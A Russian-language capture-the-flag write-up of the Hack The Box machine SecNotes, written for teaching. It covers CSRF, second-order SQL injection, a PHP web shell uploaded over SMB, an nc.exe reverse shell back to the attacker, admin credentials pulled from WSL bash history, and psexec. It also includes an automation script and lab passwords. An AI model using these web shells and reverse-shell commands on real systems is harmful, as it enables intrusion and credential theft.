---
layout: post
title: "HTB{ SecNotes }"
date: 2019-04-05 17:00:00 +0300
author: snovvcrash
tags: [write-up, hackthebox, machine, linux, xsrf, second-order-sqli, smb, web-shell, reverse-shell, wsl, lxss, bash-exe, impacket]
---

**SecNotes** — нетрудная машина под Windows с вариативным начальным этапом и оригинальным заключительным PrivEsc'ом. Для того, чтобы добраться до пользовательской SMB-шары (откуда ты сможешь использовать RCE через залитый веб-шелл), сперва предстоит получить доступ к аккаунту админа веб-приложения. Сделать это можно двумя способами: либо XSRF (путь, задуманный автором коробки), либо SQL-инъекция второго порядка (то, что автор не доглядел). Если же захочешь добраться до root'а, то тебе предложат взаимодействие с подсистемой Linux (WSL) с целью вытащить креды от админской SMB, а далее psexec/winexec для инициализации полноценной сессии суперпользователя. Удачи, мой друг!

<!--cut-->

<p align="right">
  <a href="https://www.hackthebox.eu/home/machines/profile/151"><img src="https://img.shields.io/badge/%e2%98%90-Hack%20The%20Box-8ac53e?style=flat-square" alt="htb-badge.svg" /></a>
  <span class="score-medium">5/10</span>
</p>

![banner.png](/assets/images/htb/machines/secnotes/banner.png)
{:.center-image}

![info.png](/assets/images/htb/machines/secnotes/info.png)
{:.center-image}

* TOC
{:toc}

# Разведка
## Nmap
Initial:
```text
root@kali:~# nmap -n -v -Pn --min-rate 5000 -oA nmap/initial -p- 10.10.10.97
...
```

```text
root@kali:~# cat nmap/initial.nmap
# Nmap 7.70 scan initiated Wed Mar 20 21:08:46 2019 as: nmap -n -v -Pn --min-rate 5000 -oA nmap/initial -p- 10.10.10.97
Nmap scan report for 10.10.10.97
Host is up (0.065s latency).
Not shown: 65532 filtered ports
PORT     STATE SERVICE
80/tcp   open  http
445/tcp  open  microsoft-ds
8808/tcp open  ssports-bcast

Read data files from: /usr/bin/../share/nmap
# Nmap done at Wed Mar 20 21:09:12 2019 -- 1 IP address (1 host up) scanned in 26.50 seconds
```

Version ([красивый отчет](/assets/reports/nmap/htb/secnotes/version.html)):
```text
root@kali:~# nmap -n -v -sV -sC -oA nmap/version --stylesheet https://raw.githubusercontent.com/snovvcrash/snovvcrash.github.io/master/reports/nmap/nmap-bootstrap.xsl -p80,445,8808 10.10.10.97
...
```

```text
root@kali:~# cat nmap/version.nmap
# Nmap 7.70 scan initiated Wed Mar 20 21:10:42 2019 as: nmap -n -v -sV -sC -oA nmap/version --stylesheet https://raw.githubusercontent.com/snovvcrash/snovvcrash.github.io/master/reports/nmap/nmap-bootstrap.xsl -p80,445,8808 10.10.10.97
Nmap scan report for 10.10.10.97
Host is up (0.064s latency).

PORT     STATE SERVICE      VERSION
80/tcp   open  http         Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
| http-title: Secure Notes - Login
|_Requested resource was login.php
445/tcp  open  microsoft-ds Windows 10 Enterprise 17134 microsoft-ds (workgroup: HTB)
8808/tcp open  http         Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows
Service Info: Host: SECNOTES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h08m41s, deviation: 4h02m31s, median: -11m19s
| smb-os-discovery: 
|   OS: Windows 10 Enterprise 17134 (Windows 10 Enterprise 6.3)
|   OS CPE: cpe:/o:microsoft:windows_10::-
|   Computer name: SECNOTES
|   NetBIOS computer name: SECNOTES\x00
|   Workgroup: HTB\x00
|_  System time: 2019-03-20T10:59:40-07:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2019-03-20 20:59:39
|_  start_date: N/A

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Mar 20 21:11:35 2019 -- 1 IP address (1 host up) scanned in 52.66 seconds
```

Имеем два веб-сервиса под управлением IIS (80, 8808) и сетевую SMB-шару (445). Взглянем на веб.

# Web — Порт 80
## Браузер
На `http://10.10.10.97:80` нас встречает логин-форма:

[![port80-browser-1.png](/assets/images/htb/machines/secnotes/port80-browser-1.png)](/assets/images/htb/machines/secnotes/port80-browser-1.png)
{:.center-image}

А на `http://10.10.10.97:80/register.php` можно регаться:

[![port80-browser-2.png](/assets/images/htb/machines/secnotes/port80-browser-2.png)](/assets/images/htb/machines/secnotes/port80-browser-2.png)
{:.center-image}

Сделаем же это, раз разрешают. Зарегистрировавшись с кредами `evilhacker:qwe123`, смотрим, что внутри:

[![port80-browser-3.png](/assets/images/htb/machines/secnotes/port80-browser-3.png)](/assets/images/htb/machines/secnotes/port80-browser-3.png)
{:.center-image}

## Угон аккаунта Тайлера. Способ 1, XSRF
В контексте первого способа получения авторизационных данных Тайлера (`tyler`, админ, узнаем это из баннера в верхней части экрана) наибольший интерес для нас представляет кнопка **Contact Us**:

[![port80-browser-4.png](/assets/images/htb/machines/secnotes/port80-browser-4.png)](/assets/images/htb/machines/secnotes/port80-browser-4.png)
{:.center-image}

Если, вооружившись netcat'ом, включить в тело сообщения для админа IP-адрес своей машины и дать *Send*, то:
```text
root@kali:~# nc -lvnp 31337
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::31337
Ncat: Listening on 0.0.0.0:31337
Ncat: Connection from 10.10.10.97.
Ncat: Connection from 10.10.10.97:56367.
GET / HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.17134.228
Host: 10.10.14.135:31337
Connection: Keep-Alive
```

Мы поймаем отклик (от лица `WindowsPowerShell`, это важно). В общем смысле это означает ничто иное, как то, что ссылки из сообщений админу автоматически "обкликиваются"; для нарушителя в лице нас это же означает ничто иное, как возможность проведения [XSRF-атаки](https://www.owasp.org/index.php/Cross-Site_Request_Forgery_%28CSRF%29_Prevention_Cheat_Sheet "Cross-Site Request Forgery (CSRF) Prevention Cheat Sheet - OWASP").

### XSRF — это...
XSRF (aka *Сross Site Request Forgery*, *CSRF*) — это старая как мир веб-атака, заключающаяся в выполнении непреднамеренных действий от лица пользователя веб-ресурса, уязвимого к оной атаке, через создание вредоносной URL-ссылки. Когда ничего не подозревающий посетитель сайта кликает на такую ссылку, он, сам того не желая, может стать своим же палачом, выполнив ряд угодных атакующему действий в фоновом режиме.

Защита от подобного рода атак тривиальна: вводятся дополнительные сущности (CSRF-токены), выступающие в роли уникального для каждой сессии секретного значения, которое определяет легитимность запроса.

### Change Password
Когда, залогинившись, мы осматривались на главной сайте, мы видели опцию **Change Password**. Вот, что она из себя представляет:

[![port80-browser-5.png](/assets/images/htb/machines/secnotes/port80-browser-5.png)](/assets/images/htb/machines/secnotes/port80-browser-5.png)
{:.center-image}

А вот что мы видим при изменении пароля на `newpass` и просмотре тела запроса в Burp'е (будет нужно чуть позже):
```http
POST /change_pass.php HTTP/1.1
Host: 10.10.10.97
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.10.97/change_pass.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 55
Cookie: PHPSESSID=jub4fv6e4epac1dimscs0mse0r
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1

password=newpass&confirm_password=newpass&submit=submit
```

### XSRF в действии
Учитывая тот факт, что гипотетический Тайлер кликает на все ссылки, которые содержатся в сообщении из "Contact Us", подсунем ему линк на смену своего же пароля (запрос ведь будет выполнен от его имени) и сигнализируем себе на машину об успехе операции:

[![port80-browser-6.png](/assets/images/htb/machines/secnotes/port80-browser-6.png)](/assets/images/htb/machines/secnotes/port80-browser-6.png)
{:.center-image}

```text
root@kali:~# nc -lvnp 80
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::80
Ncat: Listening on 0.0.0.0:80
Ncat: Connection from 10.10.10.97.
Ncat: Connection from 10.10.10.97:49696.
GET /SUCCESS HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.17134.228
Host: 10.10.14.71
Connection: Keep-Alive
```

Обращаю внимание, что нет смысла пытаться сделать это в iframe'е: так как на ссылку будет кликать PowerShell, а не пользователь из браузера, подобное не сработает:
```html
<html>
    <iframe src="http://10.10.10.97/change_pass.php?password=newpass&confirm_password=newpass&submit=submit"></iframe>
</html>
```

Теперь можем с чистой совестью логиниться as `tyler:newpass`. Сделав это, увидим следующее:

[![port80-browser-7.png](/assets/images/htb/machines/secnotes/port80-browser-7.png)](/assets/images/htb/machines/secnotes/port80-browser-7.png)
{:.center-image}

XSRF в первозданном виде!

# Угон аккаунта Тайлера. Способ 2, SQLi
Рассмотрим второй возможный способ просмотреть заметки Тайлера, появившейся вследствие невнимательности создателя машины. Не откладывая в долгий ящик: форма логина содержит [SQLi-инъекцию второго порядка](https://haiderm.com/second-order-sql-injection-explained-with-example/ "Second Order SQL Injection Explained with Example"). Выяснено путем проб, ошибок и экспериментов. [Позже]({{ page.url }}#sqli-второго-порядка) объясним, откуда она взялась.

Зарегистрировав пользователя с юзернеймом `' or 1=1 -- -` и паролем на свой выбор, авторизовавшись, получим такую картину:

[![port80-browser-8.png](/assets/images/htb/machines/secnotes/port80-browser-8.png)](/assets/images/htb/machines/secnotes/port80-browser-8.png)
{:.center-image}

# SMB-шара Тайлера
Заметка new-site содержит такую sensitive datУ:

[![port80-browser-9.png](/assets/images/htb/machines/secnotes/port80-browser-9.png)](/assets/images/htb/machines/secnotes/port80-browser-9.png)
{:.center-image}

Очень похоже на расшаренный SMB-ресурс.

С помощью smbmap (о котором я рассказывал в [райтапе](/2018/12/17/htb-active.html#smbmap) на Active) посмотрим, к чему у нас есть доступ:
```text
root@kali:~# smbmap -H 10.10.10.97 -u 'tyler' -p '92g!mA8BGjOirkL%OG*&'
[+] Finding open SMB ports....
[+] User SMB session establishd on 10.10.10.97...
[+] IP: 10.10.10.97:445 Name: 10.10.10.97
        Disk                                                    Permissions
        ----                                                    -----------
        ADMIN$                                                  NO ACCESS
        C$                                                      NO ACCESS
        IPC$                                                    READ ONLY
        new-site                                                READ, WRITE
```

Можем писать в `\\secnotes.htb\new-site`! И, скорее всего, это означает, что у нас есть веб-шелл :smiling_imp:

Посмотрим, что внутри:
```text
root@kali:~# smbclient '\\10.10.10.97\new-site' -U 'tyler%92g!mA8BGjOirkL%OG*&'
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Aug 19 21:06:14 2018
  ..                                  D        0  Sun Aug 19 21:06:14 2018
  iisstart.htm                        A      696  Thu Jun 21 18:26:03 2018
  iisstart.png                        A    98757  Thu Jun 21 18:26:03 2018

                12978687 blocks of size 4096. 7982821 blocks available
```

Непохоже, чтобы это счастье относилось к 80-у порту, но мы помним, что у нас есть еще один открытый неисследованный порт — 8808. И это и правда он:

[![port80-browser-10.png](/assets/images/htb/machines/secnotes/port80-browser-10.png)](/assets/images/htb/machines/secnotes/port80-browser-10.png)
{:.center-image}

# Шелл от имена Тайлера
## Web-Shell
Так как мы имеем доступ на чтение в директорию `\new-site`, дропнем туда простой веб-шелл на PHP с помощью [smbclient](/2018/12/17/htb-active.html#smbclient):
```text
root@kali:~# cat webshell.php
<?php system($_REQUEST['cmd']); ?>

root@kali:~# smbclient '\\10.10.10.97\new-site' -U 'tyler%92g!mA8BGjOirkL%OG*&' -c 'put webshell.php evil.php'
putting file webshell.php as \evil.php (0.2 kb/s) (average 0.2 kb/s)

root@kali:~# curl 'http://10.10.10.97:8808/evil.php?cmd=whoami'
secnotes\tyler
```

Отлично! Теперь есть возможность выполнения кода.

## Reverse-Shell
Когда речь идет о Windows-хосте, есть несколько способов апгрейда веб-шелла до полноценного интерактивного шелла. Один из наиболее элегантных, на мой взгляд, это использование пауэршеловского Invoke-Expression `powershell IEX()` с аргументом `webclient.downloadstring()`, нацеленным, в свою очередь, на загрузку чего-то наподобие [Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1 "nishang/Invoke-PowerShellTcp.ps1 at master · samratashok/nishang") от Nishang. Однако в случае, когда у нас есть полноценный доступ на запись, можно [вместе с бэкдором (веб-шеллом)]({{ page.url }}#secnotes_reverse_tcpsh) кинуть на жертву [nc.exe](https://eternallybored.org/misc/netcat/ "netcat 1.11 for Win32/Win64"), чтобы не усложнять себе жизнь:
```text
root@kali:~# locate nc.exe
/usr/share/seclists/Web-Shells/FuzzDB/nc.exe
/usr/share/sqlninja/apps/nc.exe
/usr/share/windows-binaries/nc.exe

root@kali:~# smbclient '\\10.10.10.97\new-site' -U 'tyler%92g!mA8BGjOirkL%OG*&' -c 'put /usr/share/windows-binaries/nc.exe nc.exe'
putting file /usr/share/windows-binaries/nc.exe as \nc.exe (158.0 kb/s) (average 158.0 kb/s)
```

Триггерим подключение к нашей машине через curl:
```text
root@kali:~# curl 'http://10.10.10.97:8808/evil.php?cmd=nc.exe+10.10.14.71+443+-e+c:\windows\system32\cmd.exe'

```

И получаем, наконец, свой реверс-шелл и забираем первый флаг:
```text
root@kali:~# nc -lvnp 443
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.97.
Ncat: Connection from 10.10.10.97:49681.
Microsoft Windows [Version 10.0.17134.228]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\inetpub\new-site>whoami
whoami
secnotes\tyler
```

### user.txt
```text
C:\inetpub\new-site>type C:\Users\tyler\Desktop\user.txt
type C:\Users\tyler\Desktop\user.txt
6fa75569????????????????????????
```

# PrivEsc: tyler → Administrator
Блуждая по хосту, можно обнаружить много отсылок к подсистеме Linux ([*WSL*](https://ru.wikipedia.org/wiki/Windows_Subsystem_for_Linux "Windows Subsystem for Linux — Википедия"), aka ***W**indows **S**ubsystem for **L**inux*), например, это ярлык `bash.lnk` на рабочем столе Тайлера:
```text
C:\inetpub\new-site>cd C:\Users\tyler\Desktop
cd C:\Users\tyler\Desktop

C:\Users\tyler\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 9CDD-BADA

 Directory of C:\Users\tyler\Desktop

08/19/2018  03:51 PM    <DIR>          .
08/19/2018  03:51 PM    <DIR>          ..
06/22/2018  03:09 AM             1,293 bash.lnk
04/11/2018  04:34 PM             1,142 Command Prompt.lnk
04/11/2018  04:34 PM               407 File Explorer.lnk
06/21/2018  05:50 PM             1,417 Microsoft Edge.lnk
06/21/2018  09:17 AM             1,110 Notepad++.lnk
08/19/2018  09:25 AM                34 user.txt
08/19/2018  10:59 AM             2,494 Windows PowerShell.lnk
               7 File(s)          7,897 bytes
               2 Dir(s)  33,251,074,048 bytes free
```

Поэтому, логично предположить, что копать нужно именно в эту сторону.

## 1-й способ: bash.exe
Указывает вышеупомянутый ярлык на `C:\Windows\System32\bash.exe`, которого в системе попросту нет:
```text
C:\Users\tyler\Desktop>type bash.lnk
type bash.lnk
*************
*** мусор ***
*************
Application@v(        i1SPSjc(=OMC:\Windows\System32\bash.exe91SPSmDpHH@.=xhH(bP
```

```text
C:\Users\tyler\Desktop>C:\Windows\System32\bash.exe
C:\Windows\System32\bash.exe
'C:\Windows\System32\bash.exe' is not recognized as an internal or external command,
operable program or batch file.
```

Поэтому линка сломанная, и нам придется искать нужный бинарник вручную:
```text
C:\Users\tyler\Desktop>where /R C:\ bash.exe
where /R C:\ bash.exe
C:\Windows\WinSxS\amd64_microsoft-windows-lxss-bash_31bf3856ad364e35_10.0.17134.1_none_251beae725bc7de5\bash.exe
```

Ну а дальше все банально: запускаем баш, призываем PTY-шелл (стандартно, как под Линуксами) и смотрим `.bash_history`, который по счастливой случайности оказывается непустым:
```text
C:\Users\tyler\Desktop>C:\Windows\WinSxS\amd64_microsoft-windows-lxss-bash_31bf3856ad364e35_10.0.17134.1_none_251beae725bc7de5\bash.exe
C:\Windows\WinSxS\amd64_microsoft-windows-lxss-bash_31bf3856ad364e35_10.0.17134.1_none_251beae725bc7de5\bash.exe
mesg: ttyname failed: Inappropriate ioctl for device
whoami
root

id
uid=0(root) gid=0(root) groups=0(root)

python -c 'import pty; pty.spawn("/bin/bash")'
root@SECNOTES:~# ls -la
ls -la
total 8
drwx------ 1 root root  512 Jun 22  2018 .
drwxr-xr-x 1 root root  512 Jun 21  2018 ..
---------- 1 root root  398 Jun 22  2018 .bash_history
-rw-r--r-- 1 root root 3112 Jun 22  2018 .bashrc
-rw-r--r-- 1 root root  148 Aug 17  2015 .profile
drwxrwxrwx 1 root root  512 Jun 22  2018 filesystem
```

```text
root@SECNOTES:~# cat .bash_history
cat .bash_history
cd /mnt/c/
ls
cd Users/
cd /
cd ~
ls
pwd
mkdir filesystem
mount //127.0.0.1/c$ filesystem/
sudo apt install cifs-utils
mount //127.0.0.1/c$ filesystem/
mount //127.0.0.1/c$ filesystem/ -o user=administrator
cat /proc/filesystems
sudo modprobe cifs
smbclient
apt install smbclient
smbclient
smbclient -U 'administrator%u6!4ZwgwOM#^OBf#Nwnh' \\\\127.0.0.1\\c$
> .bash_history
less .bash_history
```

Видим админские креды :tada:

Судя по содержимому истории команд, админ монитровал локальную файловую систему, а затем даже сделал попытку почистить за собой, вот только `.bash_history` записывается при завершении сессии. Таким образом, он очистил историю *до* этого момента, а все, что было прописано в этот раз, осталось.

## 2-й способ: rootfs
Файловая система `rootfs` линуксовой подсистемы живет где-то в недрах директории `AppData`, поэтому ее расположение можно найти способом аналогичным тому, как мы искали `bash.exe`:
```text
C:\Users\tyler\Desktop>where /R C:\ .bash_history
where /R C:\ .bash_history
C:\Users\tyler\AppData\Local\Packages\CanonicalGroupLimited.Ubuntu18.04onWindows_79rhkp1fndgsc\LocalState\rootfs\root\.bash_history

C:\Users\tyler\Desktop>cd C:\Users\tyler\AppData\Local\Packages\CanonicalGroupLimited.Ubuntu18.04onWindows_79rhkp1fndgsc\LocalState\rootfs
cd C:\Users\tyler\AppData\Local\Packages\CanonicalGroupLimited.Ubuntu18.04onWindows_79rhkp1fndgsc\LocalState\rootfs
```

```text
C:\Users\tyler\AppData\Local\Packages\CanonicalGroupLimited.Ubuntu18.04onWindows_79rhkp1fndgsc\LocalState\rootfs>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 9CDD-BADA

 Directory of C:\Users\tyler\AppData\Local\Packages\CanonicalGroupLimited.Ubuntu18.04onWindows_79rhkp1fndgsc\LocalState\rootfs

06/21/2018  06:03 PM    <DIR>          .
06/21/2018  06:03 PM    <DIR>          ..
06/21/2018  06:03 PM    <DIR>          bin
06/21/2018  06:00 PM    <DIR>          boot
06/21/2018  06:00 PM    <DIR>          dev
06/22/2018  03:00 AM    <DIR>          etc
06/21/2018  06:00 PM    <DIR>          home
03/21/2019  12:24 PM            87,944 init
06/21/2018  06:00 PM    <DIR>          lib
06/21/2018  06:00 PM    <DIR>          lib64
06/21/2018  06:00 PM    <DIR>          media
06/21/2018  06:03 PM    <DIR>          mnt
06/21/2018  06:00 PM    <DIR>          opt
06/21/2018  06:00 PM    <DIR>          proc
06/22/2018  02:44 PM    <DIR>          root
06/21/2018  06:00 PM    <DIR>          run
06/22/2018  02:57 AM    <DIR>          sbin
06/21/2018  06:00 PM    <DIR>          snap
06/21/2018  06:00 PM    <DIR>          srv
06/21/2018  06:00 PM    <DIR>          sys
06/22/2018  02:25 PM    <DIR>          tmp
06/21/2018  06:02 PM    <DIR>          usr
06/21/2018  06:03 PM    <DIR>          var
               1 File(s)         87,944 bytes
              22 Dir(s)  33,248,010,240 bytes free
```

Отсюда можно заглянуть в `root` и точно так же посмотреть `.bash_history`:
```text
C:\Users\tyler\AppData\Local\Packages\CanonicalGroupLimited.Ubuntu18.04onWindows_79rhkp1fndgsc\LocalState\rootfs\root>type .bash_history
type .bash_history
cd /mnt/c/
ls
cd Users/
cd /
cd ~
ls
pwd
mkdir filesystem
mount //127.0.0.1/c$ filesystem/
sudo apt install cifs-utils
mount //127.0.0.1/c$ filesystem/
mount //127.0.0.1/c$ filesystem/ -o user=administrator
cat /proc/filesystems
sudo modprobe cifs
smbclient
apt install smbclient
smbclient
smbclient -U 'administrator%u6!4ZwgwOM#^OBf#Nwnh' \\\\127.0.0.1\\c$
> .bash_history
less .bash_history
exit
```

## ФС от админа
Что делать с полученными админскими кредами? Во-первых, можно подключиться к привилегированной шаре `C$`.

Сделать это можно прямо с Винды, не отходя от кассы:
```text
C:\Users\tyler>net use \\127.0.0.1\C$ /user:Administrator "u6!4ZwgwOM#^OBf#Nwnh"
net use \\127.0.0.1\C$ /user:Administrator "u6!4ZwgwOM#^OBf#Nwnh"
The command completed successfully.
```

### root.txt
```text
C:\Users\tyler>type \\127.0.0.1\C$\Users\Administrator\Desktop\root.txt
type \\127.0.0.1\C$\Users\Administrator\Desktop\root.txt
7250cde1????????????????????????
```

Аналогично, это можно провернуть через smbclient с машины атакующего.

## Шелл от админа
Полноценный же шелл можно получить с помощью psexec или winexec:
```text
root@kali:~# psexec.py Administrator:'u6!4ZwgwOM#^OBf#Nwnh'@10.10.10.97
Impacket v0.9.18-dev - Copyright 2002-2018 Core Security Technologies

[*] Requesting shares on 10.10.10.97.....
[*] Found writable share ADMIN$
[*] Uploading file BhMvtfKj.exe
[*] Opening SVCManager on 10.10.10.97.....
[*] Creating service dBdy on 10.10.10.97.....
[*] Starting service dBdy.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17134.228]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32>whoami
nt authority\system
```

```text
C:\WINDOWS\system32>type C:\Users\Administrator\Desktop\root.txt
7250cde1????????????????????????
```

SecNotes пройдена :triumph:

![owned-user.png](/assets/images/htb/machines/secnotes/owned-user.png)
{:.center-image}

![owned-root.png](/assets/images/htb/machines/secnotes/owned-root.png)
{:.center-image}

![trophy.png](/assets/images/htb/machines/secnotes/trophy.png)
{:.center-image}

# Эпилог
## secnotes_reverse_tcp.sh
Корневая директория веб-сервера очищается по таймеру, что определенно раздражает.

Чтобы заново не загружать весь необходимый стафф по отдельности, можно воспользоваться таким bash-скриптом:
```bash
#!/usr/bin/env bash

if [ "$#" -ne 2 ]; then
	echo "Usage: $0 [IP] [PORT]"
	exit
fi;

IP=$1
PORT=$2

echo "[*] Uploading evil.php and nc.exe"
smbclient //10.10.10.97/new-site -U 'tyler%92g!mA8BGjOirkL%OG*&' -c 'put webshell.php evil.php' || (echo "[-] evil.php: Upload failed" && exit 1)
smbclient //10.10.10.97/new-site -U 'tyler%92g!mA8BGjOirkL%OG*&' -c 'put /usr/share/windows-binaries/nc.exe nc.exe' || (echo "[-] nc.exe: Upload failed" && exit 1)
echo "[+] Sucessfully uploaded evil.php and nc.exe"

echo "[*] Triggering nc shell callback to ${IP}:${PORT}"
curl "http://10.10.10.97:8808/evil.php?cmd=nc.exe+${IP}+${PORT}+-e+c:\windows\system32\cmd.exe"
```

```text
root@kali:~# chmod +x secnotes_reverse_tcp.sh
root@kali:~# ./secnotes_reverse_tcp.sh 10.10.14.71 443
[*] Uploading evil.php and nc.exe
putting file webshell.php as \evil.php (0.2 kb/s) (average 0.2 kb/s)
putting file /usr/share/windows-binaries/nc.exe as \nc.exe (207.1 kb/s) (average 207.1 kb/s)
[+] Sucessfully uploaded evil.php and nc.exe
[*] Triggering nc shell callback to 10.10.14.71:443

```

```text
root@kali:~# nc -lvnp 443
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.97.
Ncat: Connection from 10.10.10.97:49690.
Microsoft Windows [Version 10.0.17134.228]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\inetpub\new-site>
```

## SQLi второго порядка
Выясним, откуда растут ноги у SQL-инъекции второго порядка. Для этого проанализируем исходный код приложения, осуществляющий взаимодействие с базой данных.

Вот вся магия, которая управляет веб-сайтом (да еще к тому же имитирует поведение Тайлера):
```text
C:\inetpub\wwwroot>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 9CDD-BADA

 Directory of C:\inetpub\wwwroot

06/22/2018  05:51 AM    <DIR>          .
06/22/2018  05:51 AM    <DIR>          ..
06/22/2018  05:57 AM               402 auth.php
06/22/2018  05:57 AM             3,887 change_pass.php
06/22/2018  06:17 AM             2,556 contact.php
06/22/2018  05:57 AM               670 db.php
06/22/2018  05:58 AM             4,315 home.php
06/22/2018  05:57 AM             4,221 login.php
06/15/2018  01:44 PM               235 logout.php
06/22/2018  05:57 AM             5,168 register.php
06/22/2018  05:59 AM             3,956 submit_note.php
06/16/2018  07:05 PM               548 web.config
              10 File(s)         25,958 bytes
               2 Dir(s)  33,245,876,224 bytes free
```

### Авторизация
Для начала посмотрим на `login.php` — PHP-скрипт, отвечающий за процесс авторизации пользователя на сайте:
```php
<?php
// Include config file
$includes = 1;
require_once 'db.php';

// Define variables and initialize with empty values
$username = $password = "";
$username_err = $password_err = "";

// Processing form data when form is submitted
if($_SERVER["REQUEST_METHOD"] == "POST"){

    // Check if username is empty
    if(empty(trim($_POST["username"]))){
        $username_err = 'Please enter username.';
    } else{
        $username = trim($_POST["username"]);
    }

    // Check if password is empty
    if(empty(trim($_POST['password']))){
        $password_err = 'Please enter your password.';
    } else{
        $password = trim($_POST['password']);
    }

    // Validate credentials
    if(empty($username_err) && empty($password_err)){
        // Prepare a select statement
        $sql = "SELECT username, password FROM users WHERE username = ?";

        if($stmt = mysqli_prepare($link, $sql)){
            // Bind variables to the prepared statement as parameters
            mysqli_stmt_bind_param($stmt, "s", $param_username);

            // Set parameters
            $param_username = $username;

            // Attempt to execute the prepared statement
            if(mysqli_stmt_execute($stmt)){
                // Store result
                mysqli_stmt_store_result($stmt);

                // Check if username exists, if yes then verify password
                if(mysqli_stmt_num_rows($stmt) == 1){
                    // Bind result variables
                    mysqli_stmt_bind_result($stmt, $username, $hashed_password);
                    if(mysqli_stmt_fetch($stmt)){
                        if(password_verify($password, $hashed_password)){
                            /* Password is correct, so start a new session and
                            save the username to the session */
                            session_start();
                            $_SESSION['username'] = $username;
                            header("location: home.php");
                        } else{
                            // Display an error message if password is not valid
                            $password_err = 'The password you entered was not valid.';
                        }
                    }
                } else{
                    // Display an error message if username doesn't exist
                    $username_err = 'No account found with that username.';
                }
            } else{
                echo "Oops! Something went wrong. Please try again later.";
            }
        }

        // Close statement
        mysqli_stmt_close($stmt);
    }

    // Close connection
    mysqli_close($link);
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Secure Notes - Login</title>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.css">
    <style type="text/css">
        body{ font: 14px sans-serif; }
        .wrapper{ width: 350px; padding: 20px; }
    </style>
</head>
<body>
    <div class="wrapper">
        <h2>Login</h2>
        <p>Please fill in your credentials to login.</p>
        <form action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]); ?>" method="post">
            <div class="form-group <?php echo (!empty($username_err)) ? 'has-error' : ''; ?>">
                <label>Username</label>
                <input type="text" name="username"class="form-control" value="<?php echo $username; ?>">
                <span class="help-block"><?php echo $username_err; ?></span>
            </div>
            <div class="form-group <?php echo (!empty($password_err)) ? 'has-error' : ''; ?>">
                <label>Password</label>
                <input type="password" name="password" class="form-control">
                <span class="help-block"><?php echo $password_err; ?></span>
            </div>
            <div class="form-group">
                <input type="submit" class="btn btn-primary" value="Login">
            </div>
            <p>Don't have an account? <a href="register.php">Sign up now</a>.</p>
        </form>
    </div>
</body>
</html>
```

В этой секции видно, что для экранирования пользовательского ввода используются подготовленные запросы через `mysqli_prepare()` и `mysqli_stmt_execute()`:
```php
// Prepare a select statement
$sql = "SELECT username, password FROM users WHERE username = ?";

if($stmt = mysqli_prepare($link, $sql)){
    // Bind variables to the prepared statement as parameters
    mysqli_stmt_bind_param($stmt, "s", $param_username);

    // Set parameters
    $param_username = $username;

    // Attempt to execute the prepared statement
    if(mysqli_stmt_execute($stmt)){
        // Store result
        mysqli_stmt_store_result($stmt);

        // Check if username exists, if yes then verify password
        if(mysqli_stmt_num_rows($stmt) == 1){
            // Bind result variables
            mysqli_stmt_bind_result($stmt, $username, $hashed_password);
```

Следовательно, инъекция на этапе логина невозможна.

### Загрузка заметок
А вот если открыть `home.php`, то мы можем найти тот самый неэкранированный ввод, полностью подконтрольный пользователю извне:
```php
<?php
$sql = "SELECT id, title, note, created_at FROM posts WHERE username = '" . $username . "'";
$res = mysqli_query($link, $sql);
if (mysqli_num_rows($res) > 0) {     
    while ($row = mysqli_fetch_row($res)) {                                             
        echo '<button class="accordion"><strong>' . $row[1] . '</strong>  <small>[' . $row[3] . ']</small></button>';
        echo '<a href=/home.php?action=delete&id=' . $row[0] . '" class="btn btn-danger"><strong>X</strong></a>';
        echo '<div class="panel center-block text-left" style="width: 78%;"><pre>' . $row[2] . '</pre></div>';
    }                                     
} else {                    
    echo '<p>User <strong>' . $username . '</strong> has no notes. Create one by clicking below.</p>';
}                             
?>
```

